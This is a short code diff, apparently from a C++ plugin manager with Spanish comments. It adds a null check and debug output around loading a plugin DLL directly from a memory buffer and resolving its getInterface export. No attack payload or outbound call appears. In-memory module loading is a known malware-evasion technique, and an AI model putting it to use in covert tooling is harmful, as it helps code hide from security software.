@@ -52,17 +52,20 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     PluginManagerInterfacePrivate* pluginPrivate;
     bool result = false;
 
+    printf("Cargando plugin....\n");
     newPlugin = new plugin();
     //Cargamos el plugin
-    newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,"");
-    //Buscamos las funciones exportadas
-    getInterface = (pgetInterface)GetProcAddress(hModule,"getInterface");
-    if((newPlugin->plugInterface = getInterface())){
-        newPlugin->ID = pluginModule->PluginID;
-        pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
-        pluginList = pluginPrivate;
-        result = true;
-    }else delete newPlugin;
+    if(newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,"")){
+        //Buscamos las funciones exportadas
+        getInterface = (pgetInterface)GetProcAddress(hModule,"getInterface");
+        if((newPlugin->plugInterface = getInterface())){
+            newPlugin->ID = pluginModule->PluginID;
+            pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
+            pluginList = pluginPrivate;
+            result = true;
+        }else delete newPlugin;
+    }
+    printf("Cargado plugin: %s\n",result?"true":"false");
     return result;
 }
 plugin* PluginManager::getPluginById(ulong id){
